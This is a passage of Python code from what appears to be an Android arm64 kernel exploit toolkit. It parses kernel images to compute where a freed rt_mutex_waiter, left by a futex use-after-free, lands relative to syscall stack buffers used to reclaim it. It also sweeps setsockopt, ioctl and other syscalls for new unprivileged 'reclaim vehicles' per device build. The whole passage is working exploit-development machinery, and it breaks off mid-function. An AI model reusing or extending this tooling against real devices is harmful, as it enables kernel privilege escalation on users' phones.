    """chain_slot_delta() against whichever of _BPF_CHAIN_NEW/_BPF_CHAIN_OLD
    this build actually has -- see the comment above for which targets take
    which shape. Two shapes of the same fact, not two different facts, same
    pattern as _sigreturn_delta().

    Returns (delta_bytes, note) or (None, error_string).
    """
    chain = _BPF_CHAIN_NEW if _BPF_CHAIN_NEW[-1] in syms else _BPF_CHAIN_OLD
    if chain[-1] not in syms:
        return None, f"neither {_BPF_CHAIN_NEW[-1]} nor {_BPF_CHAIN_OLD[-1]} in kallsyms"
    return chain_slot_delta(img, syms, text, _FUTEX_CHAIN, _WAITER_WITNESSES,
                            chain, _BPF_WITNESSES)


# The IPv4 MCAST_JOIN_SOURCE_GROUP reclaim vehicle's own chain: setsockopt(2)
# down to do_ip_setsockopt(), whose own stack frame holds the 264-byte
# `struct group_source_req greqs` the multicast-source optnames copy into.
# do_mcast_group_source() is inlined into do_ip_setsockopt() on every build
# checked (android14-6.1, android15-6.6, qgki-5.4), so the buffer-owning frame
# is do_ip_setsockopt itself. The chain has two INDIRECT bl hops
# (ops->setsockopt, sk_prot->setsockopt), which chain_slot_delta()'s
# _chain_validated() cannot see, so this rule sums the frames by hand rather
# than calling chain_slot_delta.
_MCAST_V4_CHAIN = ("__arm64_sys_setsockopt", "__sys_setsockopt",
                   "sock_common_setsockopt", "udp_setsockopt", "ip_setsockopt",
                   "do_ip_setsockopt")
# sizeof(struct group_source_req) on arm64: gsr_interface (4) + pad (4) +
# gsr_group (sockaddr_storage, 128) + gsr_source (sockaddr_storage, 128) = 264.
_MCAST_GREQS_BYTES = 0x108


def _movz_imm(w):
    """MOVZ Rd, #imm{, LSL #n} -> (Rd, value), else None. Capstone prints this
    as `mov w2, #0x108`; the greqs size is materialised this way."""
    if (w & 0x7F80001F) >> 23 != 0b010100101 >> 1 and (w & 0x7F800000) not in (
            0x52800000, 0xD2800000):
        return None
    hw = (w >> 21) & 3
    return w & 0x1F, ((w >> 5) & 0xFFFF) << (hw * 16)


def _add_sp_dst(w):
    """ADD Rd, sp, #imm (64-bit, incl. `mov Rd, sp` == ADD Rd, sp, #0) ->
    (Rd, imm), else None."""
    if (w & 0xFFC00000) != 0x91000000:      # ADD (immediate), 64-bit, sh=0
        return None
    if ((w >> 5) & 0x1F) != 31:             # Rn must be sp
        return None
    return w & 0x1F, (w >> 10) & 0xFFF


def _mcast_greqs_slot(img, syms, text):
    """The sp-relative offset of the 264-byte struct group_source_req in
    do_ip_setsockopt(). The struct is memset(&greqs, 0, 0x108) before the
    optlen-sized copy_from_sockptr() into it, and that memset (immediate size
    0x108, dst in x0 as sp+imm) uniquely names the slot -- the copy's own size
    is a register (the user optlen) on some builds, so the memset is the
    reliable anchor. Falls back to a copy_from_* whose immediate size is 0x108
    for a build that stores the zero inline instead of calling memset.

    Returns the sp offset, or None if the buffer's copy site was not found.
    """
    if "do_ip_setsockopt" not in syms:
        return None
    start = syms["do_ip_setsockopt"] - text
    nxt = _func_span(syms, "do_ip_setsockopt", 0x4000)
    memset_addrs = _callee_addrs(syms, "memset")
    copy_addrs = set(_callee_addrs(syms, "__arch_copy_from_user")) | set(
        _callee_addrs(syms, "_copy_from_user")) | set(
        _callee_addrs(syms, "copy_from_sockptr"))
    x0 = x2 = None
    memset_hit = copy_hit = None
    for i in range(0, nxt, 4):
        w = _u32(img, start + i)
        a = _add_sp_dst(w)
        if a is not None and a[0] == 0:     # add x0, sp, #imm
            x0 = a[1]
        m = _movz_imm(w)
        if m is not None and m[0] == 2:     # movz w2/x2, #imm
            x2 = m[1]
        tgt = _bl_target(w, syms["do_ip_setsockopt"] + i)
        if tgt is None:
            continue
        if x2 == _MCAST_GREQS_BYTES and x0 is not None:
            if memset_hit is None and tgt in memset_addrs:
                memset_hit = x0
            if copy_hit is None and tgt in copy_addrs:
                copy_hit = x0
        x0 = x2 = None                      # registers do not survive a call
    return memset_hit if memset_hit is not None else copy_hit


def _mcast_delta(img, syms, text):
    """MCAST_WAITER_OFF: the byte delta between the freed rt_mutex_waiter's
    stack slot (the futex chain) and do_ip_setsockopt()'s own group_source_req
    buffer, both relative to the shared invoke_syscall entry frame. The two
    indirect socket-ops hops keep this off chain_slot_delta()'s validated path,
    so the frame sum is done here (the abs_a/abs_b arithmetic is identical).

    Returns (delta_bytes, note) or (None, error_string).
    """
    for name in _FUTEX_CHAIN + _MCAST_V4_CHAIN:
        if name not in syms:
            return None, f"{name} absent from kallsyms"
        if _frame_of(img, syms, name, text) is None:
            return None, f"no static frame adjustment found in {name}"
    frames = {n: _frame_of(img, syms, n, text)
              for n in _FUTEX_CHAIN + _MCAST_V4_CHAIN}
    span_a = _func_span(syms, _FUTEX_CHAIN[-1], _SPAN_CAP)
    slot_a, wit_a = _witness_slot(img, syms, text, _FUTEX_CHAIN[-1], span_a,
                                  _WAITER_WITNESSES)
    if slot_a is None:
        return None, wit_a
    slot_b = _mcast_greqs_slot(img, syms, text)
    if slot_b is None:
        return None, ("no 0x108-byte group_source_req copy found in "
                      "do_ip_setsockopt")
    abs_a = -sum(frames[n] for n in _FUTEX_CHAIN) + slot_a
    abs_b = -sum(frames[n] for n in _MCAST_V4_CHAIN) + slot_b
    return abs_a - abs_b, ("%s slot at sp+%#x (via %s), do_ip_setsockopt greqs "
                           "at sp+%#x" % (_FUTEX_CHAIN[-1], slot_a, wit_a,
                                          slot_b))


def _depth_tracked_witness_slot(img, syms, text, fn, span, callee, argreg):
    """_witness_slot()'s search narrowed to a single (callee, argreg)
    candidate and run over _scan_sp_regs(), for a function whose stack use is
    not monotonic -- both restore_fpsimd_context (qgki-5.4) and
    __arm64_sys_rt_sigreturn's own inlined shape have this property (both
    `sub`, then `add` back, before the relevant copy), so the frame at the
    call is shallower than _frame_of()'s prologue-only figure.

    The FIRST `bl <callee>` with argreg live answers; unlike _witness_slot()
    this does not cross-check the remaining call sites, so the caller's
    precondition is that <fn> makes exactly one such call (see
    _sigreturn_delta() for the shape this is used on).

    The value is a signed offset from <fn>'s own entry sp (address = entry
    sp + value), the sign convention chain_slot_delta()'s abs_a/abs_b use --
    do not combine it with a separate _frame_of(fn) call.

    Returns (sp_offset_from_entry, witness_name) or (None, error).
    """
    want = _callee_addrs(syms, callee)
    if not want:
        return None, f"{callee} absent from kallsyms"
    for i, w, regs, _depth in _scan_sp_regs(img, syms, text, fn, span):
        tgt = _bl_target(w, syms[fn] + i)
        if tgt is not None and tgt in want and argreg in regs:
            return regs[argreg], callee
    return None, f"no witness in {fn}; tried {callee}"


def _sigreturn_delta(img, syms, text):
    """SIGRETURN_WAITER_OFF's own derivation -- the byte delta between the
    real rt_mutex_waiter's stack slot (the futex chain) and the stack-local
    struct user_fpsimd_state the fpsimd record's __arch_copy_from_user()
    fills.

    Two shapes, picked by which symbols this build's kallsyms actually has,
    not by kernel version: on android14-6.1/android15-6.6,
    restore_sigframe/parse_user_sigframe/restore_fpsimd_context are all
    inlined into __arm64_sys_rt_sigreturn, which then calls the copy helper
    several times for unrelated pieces of the sigframe -- a case
    _witness_slot()'s single-candidate model cannot disambiguate, so
    _sigreturn_fpsimd_slot() does, by SEQUENCE (which call precedes
    fpsimd_update_current_state()). On qgki-5.4, restore_fpsimd_context
    survives as its own real function with exactly one
    __arch_copy_from_user call in it -- an ordinary chain_slot_delta()-style
    witness search, no disambiguation needed at all.

    Returns (delta_bytes, note) or (None, error_string).
    """
    err = _chain_validated(img, syms, text, _FUTEX_CHAIN)
    if err:
        return None, err

    frames = {}
    for name in _FUTEX_CHAIN:
        f = _frame_of(img, syms, name, text)
        if f is None:
            return None, f"no static frame adjustment found in {name}"
        frames[name] = f
    span_a = _func_span(syms, _FUTEX_CHAIN[-1], _SPAN_CAP)
    slot_a, witness_a = _witness_slot(img, syms, text, _FUTEX_CHAIN[-1],
                                      span_a, _WAITER_WITNESSES)
    if slot_a is None:
        return None, witness_a
    abs_a = -sum(frames[n] for n in _FUTEX_CHAIN) + slot_a

    if _SIGRETURN_SEPARATE_CHAIN[-1] in syms:
        chain_b = _SIGRETURN_SEPARATE_CHAIN
        err = _chain_validated(img, syms, text, chain_b)
        if err:
            return None, err
        # Every hop EXCEPT the last is a thin wrapper (_frame_of()'s
        # prologue-only sum is fine there); the last hop
        # (restore_fpsimd_context) is the one whose stack use is
        # non-monotonic -- see _depth_tracked_witness_slot()'s docstring --
        # so it alone is depth-tracked through its whole body instead of via
        # _frame_of().
        outer_frame = 0
        for name in chain_b[:-1]:
            f = _frame_of(img, syms, name, text)
            if f is None:
                return None, f"no static frame adjustment found in {name}"
            outer_frame += f
        span_b = _func_span(syms, chain_b[-1], _SIGRETURN_SPAN_CAP)
        inner_abs, witness_b = _depth_tracked_witness_slot(
            img, syms, text, chain_b[-1], span_b,
            _SIGRETURN_SEPARATE_WITNESSES[0][0], _SIGRETURN_SEPARATE_WITNESSES[0][1])
        if inner_abs is None:
            return None, witness_b
        abs_b = -outer_frame + inner_abs
        chain_desc = "%s (via %s)" % (chain_b[-1], witness_b)
    else:
        if _SIGRETURN_CHAIN[0] not in syms:
            return None, f"{_SIGRETURN_CHAIN[0]} absent from kallsyms"
        span_b = _func_span(syms, _SIGRETURN_CHAIN[0], _SIGRETURN_SPAN_CAP)
        # _sigreturn_fpsimd_slot() returns an offset from this function's
        # own entry sp -- see its docstring for why a separate _frame_of()
        # call is wrong here.
        abs_b, err_b = _sigreturn_fpsimd_slot(
            img, syms, text, _SIGRETURN_CHAIN[0], _SIGRETURN_COPY_CALLEE,
            _SIGRETURN_CONSUMER_CALLEE, span_b, _SIGRETURN_CONSUMER_LOOKAHEAD)
        if abs_b is None:
            return None, err_b
        chain_desc = ("%s (via %s before %s, inlined)"
                     % (_SIGRETURN_CHAIN[0], _SIGRETURN_COPY_CALLEE,
                        _SIGRETURN_CONSUMER_CALLEE))

    note = ("%s slot at sp+%#x (via %s), fpsimd buffer via %s"
            % (_FUTEX_CHAIN[-1], slot_a, witness_a, chain_desc))
    return abs_a - abs_b, note


def chain_slot_delta(img, syms, text, chain_a, witnesses_a, chain_b,
                     witnesses_b):
    """The raw BYTE delta between a stack slot reached by calling down
    chain_a (ending in a call whose witnesses locate the slot) and one
    reached by calling down chain_b, both expressed relative to the shared
    entry frame (invoke_syscall's one `blr x8`) the two chains fork from.

    This is the general form of the pselect placement derivation stack()
    implements below -- factored out so a reclaim vehicle whose own copy is
    a flat byte buffer (not pselect's word-indexed fd_set) can derive its
    own WAITER_OFF the same validated way, without re-deriving the frame-sum
    machinery. chain_a is normally the futex chain ending in the real
    rt_mutex_waiter's stack slot; chain_b is the vehicle's own chain ending
    in the slot its copy lands at.

    Returns (delta_bytes, note) or (None, error_string).
    """
    for chain in (chain_a, chain_b):
        err = _chain_validated(img, syms, text, chain)
        if err:
            return None, err

    frames = {}
    for name in chain_a + chain_b:
        f = _frame_of(img, syms, name, text)
        if f is None:
            return None, f"no static frame adjustment found in {name}"
        frames[name] = f

    span_a = _func_span(syms, chain_a[-1], _SPAN_CAP)
    slot_a, witness_a = _witness_slot(img, syms, text, chain_a[-1], span_a,
                                      witnesses_a)
    if slot_a is None:
        return None, witness_a

    span_b = _func_span(syms, chain_b[-1], _SPAN_CAP)
    slot_b, witness_b = _witness_slot(img, syms, text, chain_b[-1], span_b,
                                      witnesses_b)
    if slot_b is None:
        return None, witness_b

    abs_a = -sum(frames[n] for n in chain_a) + slot_a
    abs_b = -sum(frames[n] for n in chain_b) + slot_b
    note = ("%s slot at sp+%#x (via %s), %s slot at sp+%#x (via %s)"
            % (chain_a[-1], slot_a, witness_a, chain_b[-1], slot_b, witness_b))
    return abs_a - abs_b, note


def stack(entry, img, syms, text):
    """Resolves one [STACKMAP] row, `MACRO <rule> [args]`, all of them
    answering "where does the freed rt_mutex_waiter land, relative to a
    reclaim vehicle's own copy target": a SIGNED word index (stack-overlay)
    or a SIGNED byte offset (stack-bytes-*).

    Returns (value, note) or (None, note) when the build does not support
    the read. The rules, their arguments and each vehicle's own facts are
    documented with the rows in lib/offset-maps.txt [STACKMAP].
    """
    parts = entry.split()
    if not parts:
        return None, "empty STACKMAP row"
    if len(parts) < 2:
        return None, "STACKMAP row needs MACRO and a rule keyword"
    _macro, rule = parts[0], parts[1]

    if rule == "stack-overlay":
        if len(parts) != 3:
            return None, "expected: MACRO stack-overlay <first_word>"
        first_word = int(parts[2], 0)
        delta, note = chain_slot_delta(img, syms, text, _FUTEX_CHAIN,
                                       _WAITER_WITNESSES, _SELECT_CHAIN,
                                       _FDS_WITNESSES)
        if delta is None:
            return None, note
        if delta % 8:
            return None, f"waiter lands {delta} bytes from stack_fds, not word-aligned ({note})"
        landing = delta // 8
        return landing - first_word, "%s, lands on word %d" % (note, landing)

    if rule == "stack-bytes-sigreturn":
        if len(parts) != 2:
            return None, "expected: MACRO stack-bytes-sigreturn"
        return _sigreturn_delta(img, syms, text)

    if rule == "stack-bytes-clone3":
        if len(parts) != 2:
            return None, "expected: MACRO stack-bytes-clone3"
        return chain_slot_delta(img, syms, text, _FUTEX_CHAIN,
                                _WAITER_WITNESSES, _CLONE3_CHAIN,
                                _CLONE3_WITNESSES)

    if rule == "stack-bytes-process-vm":
        if len(parts) != 2:
            return None, "expected: MACRO stack-bytes-process-vm"
        return chain_slot_delta(img, syms, text, _FUTEX_CHAIN,
                                _WAITER_WITNESSES, _PROCESS_VM_CHAIN,
                                _PROCESS_VM_WITNESSES)

    if rule == "stack-bytes-bpf":
        if len(parts) != 2:
            return None, "expected: MACRO stack-bytes-bpf"
        return _bpf_delta(img, syms, text)

    if rule == "stack-bytes-mcast":
        if len(parts) != 2:
            return None, "expected: MACRO stack-bytes-mcast"
        return _mcast_delta(img, syms, text)

    return None, f"unknown rule {rule}"


# --------------------------------------------------- reclaim-vehicle scan ---
#
# A new device is usable by a byte-copy reclaim vehicle only if some syscall's
# own on-stack buffer lands on the freed rt_mutex_waiter with the whole forged
# waiter inside it. That is a per-build fact of two functions' frame sizes
# (offset_rules can measure it), and the usable window is a property of the
# buffer, not the device:
#
#   a vehicle survives rb_erase and bridges to fake_w0 iff its WAITER_OFF lands
#   the children (waiter+0x08/+0x10), task (waiter+0x30) and lock (waiter+0x38)
#   inside the copy -- upper bound WAITER_OFF <= buffer - 0x40 for either
#   geometry, lower bound WAITER_OFF >= -8 (narrow: task+lock only, children
#   zeroed by the copy's memset, parent_color left to the frame) or >= 0
#   (full: also writes tree_parent = fake_w0). See common.h's own geometry
#   comment for the derivation.
#
# scan_reclaim_vehicles() sweeps every derivable candidate and reports which
# land in window, so porting to a new build is "run the scan" rather than
# hand-disassembling each syscall. Each row names how its WAITER_OFF is
# derived (the same _*_delta / chain_slot_delta the committed rules use) and
# its buffer's own size and geometry. tcp-zc and pselect are omitted: tcp-zc's
# offset is a fixed -8 the getsockopt frame is chosen to hold, not a measured
# fact, and pselect places by word index (stack-overlay), not a byte buffer.
_WAITER_SPAN = 0x40             # children(0x08)..lock(0x38)+8; the fields a
                                # single-copy bridge must all contain
_GEOM_LOW = {"narrow": -8, "full": 0}


def _scan_clone3(img, syms, text):
    return chain_slot_delta(img, syms, text, _FUTEX_CHAIN, _WAITER_WITNESSES,
                            _CLONE3_CHAIN, _CLONE3_WITNESSES)


def _scan_process_vm(img, syms, text):
    return chain_slot_delta(img, syms, text, _FUTEX_CHAIN, _WAITER_WITNESSES,
                            _PROCESS_VM_CHAIN, _PROCESS_VM_WITNESSES)


# (name, geometry, buffer_bytes, delta_fn). buffer_bytes are the ABI/fixed
# struct sizes the C side carries (common.h): clone3 struct clone_args = 88,
# process_vm iovstack = 128, bpf attr = 112, sigreturn vregs = 512, mcast
# group_source_req = 264.
_VEHICLE_SCAN = (
    ("clone3",     "narrow",  88, _scan_clone3),
    ("process-vm", "full",   128, _scan_process_vm),
    ("bpf",        "narrow", 112, _bpf_delta),
    ("sigreturn",  "full",   512, _sigreturn_delta),
    ("mcast",      "full",   264, _mcast_delta),
)


def scan_reclaim_vehicles(img, syms, text):
    """Derive every candidate vehicle's WAITER_OFF on this build and judge each
    against its own usable window. Returns a list of dicts, one per candidate:
        name, geometry, buffer, off (or None), low, high, in_window, note
    where [low, high] is the window and in_window is low <= off <= high.
    Callers that have a raw kallsyms should call load_duplicate_addrs() first,
    exactly as the STACKMAP rules require."""
    out = []
    for name, geom, buf, fn in _VEHICLE_SCAN:
        off, note = fn(img, syms, text)
        low = _GEOM_LOW[geom]
        high = buf - _WAITER_SPAN
        row = {
            "name": name, "geometry": geom, "buffer": buf,
            "off": off, "low": low, "high": high,
            "in_window": off is not None and low <= off <= high,
            "note": note,
        }
        out.append(row)
    return out


# ------------------------------------------------ new-vehicle discovery ---
#
# scan_reclaim_vehicles() judges the vehicles we already know. discover_vehicles()
# looks for ones we do not: it walks the static call graph from each syscall
# entry, sums frames the same way chain_slot_delta does, and at every function
# on the way records each FIXED-size copy into a stack local -- a candidate
# reclaim buffer. For each it computes the WAITER_OFF that buffer would land at
# and whether it falls in a usable window, so a new build (or a new syscall
# family) can be swept for a vehicle without naming the chain by hand.
#
# It reports candidates for human confirmation, not proven vehicles: the walk
# follows the SHORTEST call path to each copy, which is usually but not always
# the real one, and a copy landing in window still has to survive the rest of
# the chain walk (as process-vm does on 6.1 yet still hits a later BUG_ON).

_DISCOVER_COPY_CALLEES = ("__arch_copy_from_user", "_copy_from_user",
                          "copy_from_user", "copy_from_sockptr",
                          "copy_struct_from_user")

# Virtual/ops dispatches the static graph cannot follow, seeded so the walk
# crosses them. This is where the IPv4-vs-IPv6-vs-... family fork lives: one
# setsockopt entry reaches every protocol's own handler through sk_prot->/
# ops->setsockopt, so seeding both sides is what lets discovery compare them.
#
# In-window single-copy vehicles these edges reach (WAITER_OFF is per build):
#   do_ip_setsockopt / do_ipv6_setsockopt: struct compat_group_source_req
#     (0x104), the MCAST_{JOIN,LEAVE}_SOURCE_GROUP / MCAST_{,UN}BLOCK_SOURCE
#     compat arm, gated on TIF_32BIT (compat_only); android14-6.1 +72 / +96,
#     android15-6.6 +56. The native struct group_source_req (0x108) twin in
#     the same functions lands out of window (+336 / +360 / +216).
#   sock_setsockopt: a 0xFF vendor SO_* buffer at sp+0x20 on the qgki-5.4
#     build, up-to-0xFE user copy, WAITER_OFF +88, unprivileged (setsockopt on
#     a caller-owned socket).
_DISCOVER_SEED_EDGES = {
    # sk_prot->setsockopt: the per-protocol handler is a real frame on the way
    # to the ip/ipv6 layer, so the walk must go THROUGH it (skipping it drops
    # its frame and the offset lands a proto-frame short). Each proto reaches
    # its own address-family handler.
    "__sys_setsockopt": ("sock_common_setsockopt", "sock_setsockopt"),
    "sock_common_setsockopt": ("udp_setsockopt", "tcp_setsockopt",
                               "raw_setsockopt", "udpv6_setsockopt",
                               "tcpv6_setsockopt", "rawv6_setsockopt"),
    "udp_setsockopt": ("ip_setsockopt",),
    "tcp_setsockopt": ("ip_setsockopt", "do_tcp_setsockopt"),
    "raw_setsockopt": ("ip_setsockopt",),
    "udpv6_setsockopt": ("ipv6_setsockopt",),
    "tcpv6_setsockopt": ("ipv6_setsockopt",),
    "rawv6_setsockopt": ("ipv6_setsockopt",),
    "ip_setsockopt": ("do_ip_setsockopt",),
    "ipv6_setsockopt": ("do_ipv6_setsockopt",),
    "__sys_getsockopt": ("sock_common_getsockopt", "sock_getsockopt"),
    "sock_common_getsockopt": ("udp_getsockopt", "tcp_getsockopt",
                               "udpv6_getsockopt", "tcpv6_getsockopt"),
    "udp_getsockopt": ("ip_getsockopt",),
    "tcp_getsockopt": ("ip_getsockopt", "do_tcp_getsockopt"),
    "udpv6_getsockopt": ("ipv6_getsockopt",),
    "tcpv6_getsockopt": ("ipv6_getsockopt",),
    "ip_getsockopt": ("do_ip_getsockopt",),
    "ipv6_getsockopt": ("do_ipv6_getsockopt",),
    # f_op->unlocked_ioctl: the driver ioctl handler is an indirect blr the
    # static graph cannot follow. The blr for this dispatch sits in
    # do_vfs_ioctl itself on a build where vfs_ioctl is a separate helper not
    # on this path, so do_vfs_ioctl is the live dispatch frame and its own
    # frame counts.
    # The listed handlers each carry a fixed struct copy (>= 0x40) reached by
    # a direct BL once the walk is inside them; sock_ioctl forks again through
    # sock->ops->ioctl into the address-family handlers.
    "do_vfs_ioctl": ("sock_ioctl", "tty_ioctl", "snd_ctl_ioctl",
                     "snd_timer_user_ioctl", "snd_hwdep_ioctl", "ext4_ioctl",
                     "usbdev_ioctl", "tun_chr_ioctl"),
    # Companion for a build where vfs_ioctl is a separate function that holds
    # the blr (do_vfs_ioctl then BLs it). Inert where do_vfs_ioctl dispatches
    # directly (vfs_ioctl is then never reached from the ioctl root); where
    # both routes reach a handler at different depths, the offset is flagged
    # ambiguous rather than silently taken from the shorter one.
    "vfs_ioctl": ("sock_ioctl", "tty_ioctl", "snd_ctl_ioctl",
                  "snd_timer_user_ioctl", "snd_hwdep_ioctl", "ext4_ioctl",
                  "usbdev_ioctl", "tun_chr_ioctl"),
    "sock_ioctl": ("inet_ioctl", "inet6_ioctl"),
}

# Default roots: the socket entries (whose real work is behind the seeded
# indirect hops) plus a promising set of direct-copy syscalls. Passing roots=
# an explicit list, or "all" for every __arm64_sys_* handler, overrides it.
_DISCOVER_DEFAULT_ROOTS = (
    "__arm64_sys_setsockopt", "__arm64_sys_getsockopt",
    "__arm64_sys_sendmsg", "__arm64_sys_sendmmsg", "__arm64_sys_recvmsg",
    "__arm64_sys_perf_event_open", "__arm64_sys_io_submit",
    "__arm64_sys_adjtimex", "__arm64_sys_clock_adjtime",
    "__arm64_sys_timer_create", "__arm64_sys_mbind",
    "__arm64_sys_set_mempolicy", "__arm64_sys_rt_sigaction",
    "__arm64_sys_rt_sigtimedwait", "__arm64_sys_futex_waitv",
    "__arm64_sys_keyctl", "__arm64_sys_add_key",
    "__arm64_sys_process_vm_readv", "__arm64_sys_clone3", "__arm64_sys_bpf",
    "__arm64_sys_ioctl", "__arm64_sys_io_uring_setup",
    # *_time32 are the AArch32 compat time entries; get_old_timex32's struct
    # old_timex32 (0x80) copy lands in window on the qgki-5.4 build
    # (WAITER_OFF +16, window [-8, 64]), reachable from a 32-bit process.
    "__arm64_sys_clock_adjtime32", "__arm64_sys_adjtimex_time32",
)

_DISC_CALLS = {}                # fn -> tuple of direct-bl callee names (cache)
_DISC_COPIES = {}               # fn -> tuple of (slot, size) (cache)
_A2N = {}                       # id(syms) -> {addr: name} (cache)


def _addr_to_name(syms):
    """{address: symbol} for resolving a BL target back to a callee name. First
    name at an address wins (aliases like memset/__pi_memset share one)."""
    key = id(syms)
    if key not in _A2N:
        m = {}
        for n, a in syms.items():
            m.setdefault(a, n)
        _A2N[key] = m
    return _A2N[key]


_CALLEE_SETS = {}               # id(syms) -> address-set bundle (cache)

# The zeroing helper is spelled memset, __memset or __pi_memset; a build that
# keeps only the underscored names would otherwise lose every memset-anchored
# size, so the size-anchor set is the union of all three (they share one
# address where several are present).
_DISCOVER_MEMSET_CALLEES = ("memset", "__memset", "__pi_memset")

# The length argument of copy_from_sockptr is x3 (sockptr_t occupies x1/x2:
# pointer plus is_kernel flag), not the x2 that copy_from_user/memset use.
_DISCOVER_SOCKPTR_CALLEES = ("copy_from_sockptr",)

# A copy whose destination register holds one of these returns is a heap
# buffer, not a stack local, and must never be reported as a reclaim vehicle.
_DISCOVER_ALLOC_CALLEES = (
    "kmalloc", "kmalloc_trace", "__kmalloc", "__kmalloc_node",
    "__kmalloc_node_track_caller", "kmalloc_node", "kvmalloc", "kvmalloc_node",
    "kzalloc", "kcalloc", "krealloc", "vmalloc", "sock_kmalloc",
    "memdup_sockptr", "memdup_user",
)


def _copy_and_memset_addrs(syms):
    """Per-build address sets the copy scan needs, computed once:
    (copy_from_* , memset , copy_from_sockptr , allocator) targets."""
    key = id(syms)
    if key not in _CALLEE_SETS:
        def union(names):
            s = set()
            for c in names:
                s |= set(_callee_addrs(syms, c))
            return s
        _CALLEE_SETS[key] = (
            union(_DISCOVER_COPY_CALLEES), union(_DISCOVER_MEMSET_CALLEES),
            union(_DISCOVER_SOCKPTR_CALLEES), union(_DISCOVER_ALLOC_CALLEES))
    return _CALLEE_SETS[key]


def _call_targets(img, syms, text, fn):
    """The distinct functions `fn` reaches through a direct BL, in order."""
    if fn in _DISC_CALLS:
        return _DISC_CALLS[fn]
    a2n = _addr_to_name(syms)
    start = syms[fn]
    span = _func_span(syms, fn, 0x4000)
    seen, out = set(), []
    for i in range(0, span, 4):
        tgt = _bl_target(_u32(img, start - text + i), start + i)
        if tgt is None:
            continue
        name = a2n.get(tgt)
        if name and name not in seen:
            seen.add(name)
            out.append(name)
    _DISC_CALLS[fn] = tuple(out)
    return _DISC_CALLS[fn]


def _disc_cmp_imm(w):
    """CMP Wn/Xn, #imm (SUBS immediate, Rd == 31) -> (Rn, imm), else None."""
    if (w & 0x7F800000) != 0x71000000 or (w & 0x1F) != 0x1F:
        return None
    imm = (w >> 10) & 0xFFF
    if w & (1 << 22):
        imm <<= 12
    return (w >> 5) & 0x1F, imm


def _disc_is_bcond(w):
    """B.cond (any condition)."""
    return (w & 0xFF000010) == 0x54000000


def _disc_csel(w):
    """CSEL Wd/Xd, Wn, Wm, cond -> (Rd, Rn, Rm), else None."""
    if (w & 0x7FE00C00) != 0x1A800000:
        return None
    return w & 0x1F, (w >> 5) & 0x1F, (w >> 16) & 0x1F


def _disc_zero_store_sp(w):
    """STR xzr,[sp,#imm] or STP xzr,xzr,[sp,#imm] -> (sp offset, byte width),
    else None -- a stack local zeroed inline instead of by a memset call."""
    if (w & 0xFFC003FF) == 0xF90003FF:          # STR xzr,[sp,#imm] (64-bit)
        return ((w >> 10) & 0xFFF) * 8, 8
    if (w & 0xFFE07FFF) == 0xA9007FFF:          # STP xzr,xzr,[sp,#imm]
        imm = (w >> 15) & 0x7F
        if imm & 0x40:
            imm -= 0x80
        return imm * 8, 16
    return None


def _disc_tbnz_bit22(w):
    """TBNZ/TBZ wX,#22,label -> signed byte displacement, else None. Bit 22 is
    arm64 TIF_32BIT, so a copy behind this branch runs only for a compat task."""
    if (w & 0x7E000000) != 0x36000000:
        return None
    b5 = (w >> 31) & 1
    b40 = (w >> 19) & 0x1F
    if (b5 << 5) | b40 != 22:
        return None
    imm = (w >> 5) & 0x3FFF
    if imm & 0x2000:
        imm -= 0x4000
    return imm * 4


def _disc_movn_w0(w):
    """MOVN Wd,#imm with Rd == 0 -> imm16, else None -- a small negative errno
    materialised straight into the return register."""
    if (w & 0xFFE0001F) != 0x12800000:
        return None
    return (w >> 5) & 0xFFFF


def _disc_zero_span(zeros, slot):
    """Byte span of the contiguous run of inline xzr stores starting at `slot`."""
    top = slot
    while top in zeros:
        top += zeros[top]
    return top - slot


def _disc_fails_clean(img, syms, text, fn, copy_i, look=10):
    """Best-effort hint that the copy's syscall returns an error without a real
    side effect: within `look` instructions the copy's own return in w0 is
    tested (cbz/cbnz/cmp w0) or a small negative errno is loaded into w0. A
    hint, not a proof -- fail-clean is confirmed by hand on a promising row."""
    start = syms[fn] - text
    span = _func_span(syms, fn, 0x4000)
    for k in range(1, look + 1):
        j = copy_i + 4 * k
        if j >= span:
            break
        w = _u32(img, start + j)
        if (w & 0x7F00001F) == 0x34000000:          # CBZ/CBNZ w0
            return True
        if _disc_movn_w0(w) is not None:
            return True
        c = _disc_cmp_imm(w)
        if c is not None and c[0] == 0:
            return True
    return False


def _disc_compat_only(img, syms, text, fn, copy_i, back=96):
    """The copy runs only for a 32-bit (AArch32) caller: within `back`
    instructions before it a TBNZ/TBZ wX,#22 (TIF_32BIT) branches forward into
    the block that holds the copy."""
    start = syms[fn] - text
    for j in range(max(0, copy_i - back * 4), copy_i, 4):
        disp = _disc_tbnz_bit22(_u32(img, start + j))
        if disp is None:
            continue
        tgt = j + disp
        if tgt <= copy_i <= tgt + 0x200:
            return True
    return False


def _stack_copies_in(img, syms, text, fn):
    """Every fixed-size copy_from_* into a stack local in `fn`.

    Returns a tuple of dicts: slot (the `add xD,sp,#imm` immediate), size, how
    (where the size came from), memset (the zeroed span, for the children
    lower bound), sp_uncertain, fails_clean, compat_only.

    The copy size is pinned from, in order: the copy's own length immediate
    (x2, or x3 for copy_from_sockptr); a memset / inline xzr run into the same
    slot; or a length guard right before the copy -- a `cmp reg,#imm; b.cond`
    or a `csel reg,reg,#imm` clamp -- carried through the size register. A copy
    whose length cannot be pinned is skipped (a dynamic length is usually a
    heap buffer, not a fixed reclaim target), as is one whose destination
    register holds an allocator return.

    sp_uncertain marks a copy that a mid-function `add sp,sp,#imm` giveback
    precedes: the `add xD,sp,#imm` immediate is then relative to whichever sp
    the reached control-flow path left live, which a linear scan cannot settle,
    so the slot -- and the window verdict -- must be confirmed by hand."""
    if fn in _DISC_COPIES:
        return _DISC_COPIES[fn]
    copy_addrs, memset_addrs, sockptr_addrs, alloc_addrs = \
        _copy_and_memset_addrs(syms)
    start = syms[fn]
    span = _func_span(syms, fn, 0x4000)
    slots = {}          # reg -> sp-relative offset (add xD,sp,#imm; base+off; mov)
    heap = set()        # regs holding an allocator return
    movz = {}           # reg -> immediate
    cmp_of = {}         # reg -> length-guard immediate (cmp+b.cond / csel clamp)
    src = {}            # reg -> register a mov copied it from
    memset_of = {}      # slot -> zeroed byte size
    zeros = {}          # sp offset -> width of an inline xzr store
    gaveback = False    # a mid-function stack giveback has been seen
    out = []
    for i in range(0, span, 4):
        w = _u32(img, start - text + i)
        if _add_sp_imm_giveback(w) is not None:
            gaveback = True
            continue
        a = _add_sp_dst(w)                  # add xD, sp, #imm
        if a is not None:
            slots[a[0]] = a[1]
            heap.discard(a[0])
            continue
        add = _add_imm(w)                   # add xD, xN, #imm (sub-buffer)
        if add is not None:
            if add[1] in slots:
                slots[add[0]] = slots[add[1]] + add[2]
                heap.discard(add[0])
            else:
